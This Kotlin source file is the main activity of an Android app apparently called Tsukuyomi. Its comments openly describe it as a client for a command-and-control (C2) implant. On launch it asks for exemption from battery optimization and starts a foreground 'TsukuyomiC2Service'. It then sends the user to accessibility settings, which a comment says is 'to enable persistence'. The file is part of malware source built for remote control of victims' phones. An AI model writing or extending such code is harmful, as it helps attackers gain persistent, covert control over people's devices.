package com.tsukuyomi.client

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Request Ignore Battery Optimizations
        requestBatteryExemption()

        // Start Foreground C2 Service
        val serviceIntent = Intent(this, TsukuyomiC2Service::class.java)
        startForegroundService(serviceIntent)
        
        // Prompt Accessibility permission if not enabled
        checkAccessibilityPermission()
    }

    private fun requestBatteryExemption() {
        val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:$packageName")
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun checkAccessibilityPermission() {
        // Redirect user to accessibility settings to enable persistence
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        startActivity(intent)
    }
}
